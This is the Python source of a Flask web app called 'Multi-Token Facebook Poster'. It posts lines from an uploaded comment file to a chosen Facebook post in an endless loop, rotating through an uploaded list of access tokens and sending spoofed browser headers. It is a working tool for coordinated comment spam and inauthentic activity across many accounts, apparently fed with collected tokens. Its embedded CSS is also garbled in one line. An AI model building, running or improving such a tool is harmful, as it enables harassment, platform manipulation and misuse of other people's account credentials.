from flask import Flask, request
import requests
import time

app = Flask(__name__)

# Global flag to control loop
is_running = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def post_comment():
    global is_running
    if request.method == 'POST':
        is_running = True
        post_id = request.form.get('postId')
        prefix = request.form.get('prefix')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        comments = txt_file.read().decode().splitlines()

        token_file = request.files['tokenFile']
        tokens = token_file.read().decode().splitlines()

        token_index = 0

        while is_running:
            try:
                for comment in comments:
                    if not is_running:
                        print("[🛑] Cycle stopped.")
                        break

                    access_token = tokens[token_index % len(tokens)]
                    token_index += 1

                    api_url = f'https://graph.facebook.com/v15.0/{post_id}/comments'
                    full_comment = f"{prefix} {comment}"
                    payload = {'access_token': access_token, 'message': full_comment}
                    response = requests.post(api_url, data=payload, headers=headers)

                    if response.status_code == 200:
                        print(f"[✅] Comment posted: {full_comment}")
                    else:
                        print(f"[❌] Failed: {full_comment} | Status: {response.status_code}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"[⚠️] Error: {e}")
                time.sleep(30)

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Facebook Multi-Token Poster</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background-i?auto=format&fit=crop&w=1950&q=80');
                background-size: cover;
                background-position: center;
                background-repeat: no-repeat;
                background-attachment: fixed;
                font-family: Arial, sans-serif;
            }
            .container {
                max-width: 500px;
                margin-top: 40px;
                padding: 20px;
                background-color: rgba(255, 255, 255, 0.85);
                box-shadow: 0 0 10px rgba(0,0,0,0.3);
                border-radius: 8px;
            }
            .header, .footer {
                text-align: center;
                margin-bottom: 20px;
                color: #fff;
                text-shadow: 1px 1px 2px #000;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h2>Multi-Token Facebook Poster</h2>
            <p>Powered by Roshan's Cinematic HUD</p>
        </div>
        <div class="container">
            <form method="post" enctype="multipart/form-data">
                <div class="mb-3">
                    <label>Post ID:</label>
                    <input type="text" class="form-control" name="postId" required>
                </div>
                <div class="mb-3">
                    <label>Prefix (optional):</label>
                    <input type="text" class="form-control" name="prefix">
                </div>
                <div class="mb-3">
                    <label>Comment File (.txt):</label>
                    <input type="file" class="form-control" name="txtFile" accept=".txt" required>
                </div>
                <div class="mb-3">
                    <label>Token File (.txt):</label>
                    <input type="file" class="form-control" name="tokenFile" accept=".txt" required>
                </div>
                <div class="mb-3">
                    <label>Interval (seconds):</label>
                    <input type="number" class="form-control" name="time" required>
                </div>
                <div class="d-flex justify-content-between">
                    <button type="submit" class="btn btn-success w-50 me-2">Start Cinematic Cycle</button>
                    <form method="post" action="/stop" class="w-50">
                        <button type="submit" class="btn btn-danger w-100">Stop Cycle</button>
                    </form>
                </div>
            </form>
        </div>
        <div class="footer">
            <p>&copy; 2025 Roshan HUD Systems</p>
        </div>
    </body>
    </html>
    '''

@app.route('/stop', methods=['POST'])
def stop_cycle():
    global is_running
    is_running = False
    print("[🛑] Stop button pressed — cinematic cycle halted.")
    return "Cycle stop requested."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
